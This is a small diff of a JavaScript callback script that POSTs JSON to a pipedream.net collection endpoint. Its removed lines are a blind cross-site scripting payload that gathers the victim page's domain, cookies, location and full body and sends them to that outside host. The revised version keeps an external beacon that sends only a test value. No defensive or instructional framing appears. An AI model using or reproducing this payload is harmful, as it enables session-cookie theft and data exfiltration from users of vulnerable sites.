@@ -1,15 +1,8 @@
-  const headers = new Headers()
+const headers = new Headers()
 headers.append("Content-Type", "application/json")
 
-let flag = ""
-
 const body = {
-  "test": "Blind",
-  "Domain": document.domain,
-  "cookie": document.cookie,
-  "Location": document.location,
-  "flag":document.body
-  
+  "test": "event"
 }
 
 const options = {
@@ -19,4 +12,4 @@ const options = {
   body: JSON.stringify(body),
 }
 
-fetch("https://eolimcwppmmjo1s.m.pipedream.net", options)
+fetch("https://eouk09tgoyr96dk.m.pipedream.net", options)
